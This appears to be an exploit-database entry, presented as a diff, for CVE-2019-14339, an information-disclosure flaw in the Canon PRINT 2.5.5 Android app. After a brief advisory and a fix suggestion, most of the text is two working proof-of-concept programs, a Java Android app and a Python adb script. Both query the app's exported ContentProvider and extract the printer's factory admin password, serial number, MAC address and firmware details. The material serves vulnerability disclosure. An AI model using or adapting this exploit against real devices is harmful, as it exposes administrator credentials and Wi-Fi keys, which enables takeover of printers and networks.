@@ -1,0 +1,129 @@
+# Exploit Title: Content Provider URI Injection on Canon PRINT 2.5.5
+(CVE-2019-14339)
+# Date: 24th July, 2019
+# Exploit Author: 0x48piraj
+# Vendor Homepage: https://www.usa.canon.com/internet/portal/us/home/explore/printing-innovations/mobile-printing/canon-print-app
+# Software Link: https://play.google.com/store/apps/details?id=jp.co.canon.bsd.ad.pixmaprint
+<https://play.google.com/store/apps/details?id=jp.co.canon.bsd.ad.pixmaprint&hl=en_IN>#
+Exploit : https://github.com/0x48piraj/CVE-2019-14339
+# Version: Canon PRINT 2.5.5
+# Tested on: Android 8.0.0
+# CVE : CVE-2019-14339
+
+The ContentProvider in the Canon PRINT 2.5.5 application for Android
+does not properly restrict data access. This allows an attacker's
+malicious application to obtain sensitive information including
+factory passwords for administrator web-interface and WPA2-PSK key.
+The mobile application contains unprotected exported content providers
+('IJPrinterCapabilityProvider' in android/AndroidManifest.xml) that
+discloses sensitive application’s data under certain conditions. To
+securely export the content provider, one should restrict access to it
+by setting up android:protectionLevel or android:grantUriPermissions
+attributes in Android Manifest file.
+
+-- Proof-of-concept code (Java)
+
+--
+
+package cannon.print.pwn;
+
+import android.database.Cursor;
+import android.net.Uri;
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import android.widget.Toast;
+import org.apache.commons.lang3.StringUtils; //
+https://stackoverflow.com/a/50198499
+
+public class MainActivity extends AppCompatActivity {
+
+    Button PwnBtn;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        PwnBtn = (Button) findViewById(R.id.button);
+        PwnBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Toast.makeText(getApplicationContext(), "Payload
+triggered ...", Toast.LENGTH_SHORT).show();
+                Uri cannonURI =
+Uri.parse("content://canon.ij.printer.capability.data/");
+                Cursor cursor = getContentResolver().query(cannonURI,
+null, null, null, null);
+                int count  = cursor.getCount();
+                TextView data=(TextView)findViewById(R.id.data);
+                data.setText(String.valueOf(count));
+                cursor.moveToFirst();
+                String tempstr = " ";
+                tempstr ="  "+tempstr +"\t"+ cursor.getString(0) + "\t\t\t"
+                        + cursor.getString(1) + "\t\t\t" + cursor.getString(2);
+                String dpw = StringUtils.substringBetween(tempstr,
+"<ivec:product_serialnumber>", "</ivec:product_serialnumber>");
+                String dmac = cursor.getString(4);
+                String mdeviceid = cursor.getString(13); // raw
+                String dtype = StringUtils.substringBetween(mdeviceid,
+";CLS:", ";DES");
+                String timestamp = cursor.getString(15); // ticks,
+device last used
+                String dclass = StringUtils.substringBetween(tempstr,
+"<ivec:manufacturer>", "</ivec:manufacturer>");
+                String dmodel = StringUtils.substringBetween(tempstr,
+"<ivec:model>", "</ivec:model>");
+                String dserial = StringUtils.substringBetween(tempstr,
+"<ivec:serialnumber>", "</ivec:serialnumber>");
+                String dfmver = StringUtils.substringBetween(tempstr,
+"<ivec:firmver>", "</ivec:firmver>");
+                String dservice =
+StringUtils.substringBetween(tempstr, "<ivec:service>",
+"</ivec:service>");
+                /* More juicy data
+                String denv = StringUtils.substringBetween(tempstr,
+"<vcn:host_environment>", "</vcn:host_environment>");
+                String dpapertype =
+StringUtils.substringBetween(tempstr, "<ivec:papertype>",
+"</ivec:papertype>");
+                String dformats =
+StringUtils.substringBetween(tempstr, "<ivec:support_data_format>",
+"</ivec:support_data_format>");
+                */
+                String fout = String.format("Device Type : %s\nDevice
+Class : %s\nDevice Model : %s\nDevice Serial : %s\nDevice MAC Address
+: %s\nDevice Factory Password : %s\nDevice Firmware Version :
+%s\nDevice Services : %s\nDevice Last Used : %s\n", dtype, dclass,
+dmodel, dserial, dmac, dpw, dfmver, dservice, timestamp);
+                data.setText(fout);
+            }
+        });
+    }
+}
+
+-- Proof-of-concept python script over ADB --
+
+import subprocess, datetime, sys
+
+def ext(out, var, rw=';'):
+    return out.split(var)[1].split(rw)[0]
+
+print("[#] Make sure you've connected the target device w/ adb ...")
+print("[*] Running the exploit using adb ...\n\n")
+out = subprocess.getoutput("adb shell content query --uri content://canon.ij.printer.capability.data/")
+
+if "<ivec:contents>" not in out:
+    print("[!] Error: Couldn't fetch data from adb ...")
+    sys.exit(1)
+
+varz = [";CLS:", ";MDL:", ";DES:", ";VER:", ";PSE:"] #
+factory_pw_check =
+out.split("<ivec:product_serialnumber>")[1].split('</ivec:product_serialnumber>')[0]
+prmz = ["Class", "Model", "Description", "Firmware Version", "Factory Password"]
+for prm, var in zip(prmz, varz):
+	print(" -- Device %s : %s" % (prm, ext(out, var)))
+print(" -- Device MAC Address : {}".format(ext(out, 'mmacaddress=', ',')))
+print(" -- Device Last Used : %s" % (datetime.timedelta(microseconds =
+int(ext(out,', timestamp=', ', '))/10)))
